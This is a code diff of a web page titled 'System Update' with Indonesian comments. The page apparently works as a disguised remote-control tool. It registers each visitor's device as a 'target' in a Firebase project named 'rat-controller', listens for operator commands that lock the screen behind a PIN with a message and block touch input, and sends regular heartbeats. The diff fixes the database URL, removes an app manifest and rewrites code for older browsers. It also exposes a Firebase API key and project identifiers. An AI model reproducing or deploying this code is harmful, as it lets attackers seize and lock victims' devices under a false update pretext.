@@ -4,10 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Update</title>
-    
-    <!-- MANIFEST UNTUK PWA -->
-    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIlN5c3RlbSBVcGRhdGUiLAogICJzaG9ydF9uYW1lIjogIlN5c3RlbSIsCiAgImRlc2NyaXB0aW9uIjogIlN5c3RlbSBVcGRhdGUgQXBwbGljYXRpb24iLAogICJzdGFydF91cmwiOiAiLiIsCiAgImRpc3BsYXkiOiAic3RhbmRhbG9uZSIsCiAgImJhY2tncm91bmRfY29sb3IiOiAiIzAwMDAwMCIsCiAgInRoZW1lX2NvbG9yIjogIiMwMDAwMDAiLAogICJpY29ucyI6IFsKICAgIHsKICAgICAgInNyYyI6ICJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDUxMiA1MTInJTNFJTNDcmVjdCB3aWR0aD0nNTEyJyBoZWlnaHQ9JzUxMicgcng9JzUwJyBmaWxsPSclMjMwMDAlMjclM0UlM0MvdGV4dCUzRSUzQ3RleHQgeD0nMjU2JyB5PScyODAnIGZvbnQtc2l6ZT0nMjUwJyB0ZXh0LWFuY2hvcj0nbWlkZGxlJyBmaWxsPSclMjMwMGZmNDEnJTNFJUUyJTlDJTkyJTNDL3RleHQlM0UlM0Mvc3ZnJTNFIiwKICAgICAgInNpemVzIjogIjUxMng1MTIiLAogICAgICAidHlwZSI6ICJpbWFnZS9zdmcreG1sIiwKICAgICAgInB1cnBvc2UiOiAiYW55IgogICAgfQogIF0KfQ==">
-    
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -199,17 +195,16 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
         // ============================================================
-        // 🔥 DATA FIREBASE ANDA
+        // 🔥 DATA FIREBASE ANDA - SUDAH FIX
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
             authDomain: "rat-controller-5b29c.firebaseapp.com",
-            databaseURL: "https://rat-controller-5b29c-default-rtdb.azurewebsites.net",
+            databaseURL: "https://rat-controller-5b29c-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "rat-controller-5b29c",
             storageBucket: "storage.googleapis.com",
             messagingSenderId: "928595828959",
-            appId: "1:928595828959:web:e4715e3095f7456d5896a",
-            measurementId: "G-821ZZ77TPS"
+            appId: "1:928595828959:web:e4715e3095f7456d5896a"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -232,7 +227,7 @@
                     const ua = window.navigator.userAgent;
                     if (ua.includes('Android')) {
                         const match = ua.match(/Android\s([\d.]+)/);
-                        return `Android ${match ? match[1] : 'Device'}`;
+                        return 'Android ' + (match ? match[1] : 'Device');
                     }
                     if (ua.includes('iPhone') || ua.includes('iPad')) {
                         return 'iOS Device';
@@ -247,7 +242,7 @@
             deviceId = generateDeviceId();
             const deviceName = getDeviceName();
             
-            db.ref(`targets/${deviceId}`).set({
+            db.ref('targets/' + deviceId).set({
                 deviceName: deviceName,
                 online: true,
                 locked: false,
@@ -257,20 +252,20 @@
                 touchDuration: null,
                 touchBlockTime: null,
                 lastSeen: Date.now()
-            }).then(() => {
+            }).then(function() {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('statusBar').textContent = '🟢 Target Online | ID: ' + deviceId.slice(0,8);
                 startListening();
-            }).catch(err => {
+            }).catch(function(err) {
                 document.getElementById('loading').textContent = '❌ Gagal konek: ' + err.message;
                 setTimeout(registerTarget, 5000);
             });
         }
 
         function startListening() {
-            const ref = db.ref(`targets/${deviceId}`);
-            ref.on('value', (snapshot) => {
-                const data = snapshot.val();
+            var ref = db.ref('targets/' + deviceId);
+            ref.on('value', function(snapshot) {
+                var data = snapshot.val();
                 if (!data) return;
 
                 ref.update({ lastSeen: Date.now() });
@@ -319,18 +314,18 @@
             
             if (freezeInterval) clearInterval(freezeInterval);
             
-            freezeInterval = setInterval(() => {
+            freezeInterval = setInterval(function() {
                 freezeRemaining--;
                 document.getElementById('freezeCount').textContent = freezeRemaining;
                 
                 if (freezeRemaining <= 0) {
                     clearInterval(freezeInterval);
                     freezeInterval = null;
-                    db.ref(`targets/${deviceId}`).update({
+                    db.ref('targets/' + deviceId).update({
                         touchBlocked: false,
                         touchDuration: null,
                         touchBlockTime: null
-                    }).catch(() => {});
+                    }).catch(function() {});
                 }
             }, 1000);
         }
@@ -375,12 +370,12 @@
 
             if (currentPin === correctPin) {
                 document.getElementById('errorMsg').textContent = '✅ PIN BENAR! UNLOCKING...';
-                setTimeout(() => {
-                    db.ref(`targets/${deviceId}`).update({
+                setTimeout(function() {
+                    db.ref('targets/' + deviceId).update({
                         locked: false,
                         pin: null,
                         message: null
-                    }).then(() => {
+                    }).then(function() {
                         hideLockScreen();
                     });
                 }, 300);
@@ -397,9 +392,9 @@
         }
 
         function updateDots() {
-            const dots = ['dot1', 'dot2', 'dot3', 'dot4'];
-            dots.forEach((id, i) => {
-                const el = document.getElementById(id);
+            var dots = ['dot1', 'dot2', 'dot3', 'dot4'];
+            dots.forEach(function(id, i) {
+                var el = document.getElementById(id);
                 if (i < currentPin.length) {
                     el.textContent = '●';
                     el.className = 'pin-dot filled';
@@ -410,7 +405,7 @@
             });
         }
 
-        document.addEventListener('keydown', (e) => {
+        document.addEventListener('keydown', function(e) {
             if (e.key >= '0' && e.key <= '9') {
                 pressPin(e.key);
             } else if (e.key === 'Enter') {
@@ -420,16 +415,16 @@
             }
         });
 
-        setInterval(() => {
+        setInterval(function() {
             if (deviceId) {
-                db.ref(`targets/${deviceId}`).update({
+                db.ref('targets/' + deviceId).update({
                     lastSeen: Date.now(),
                     online: true
-                }).catch(() => {});
+                }).catch(function() {});
             }
         }, 10000);
 
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', function() {
             if (Notification && Notification.permission !== 'granted') {
                 Notification.requestPermission();
             }
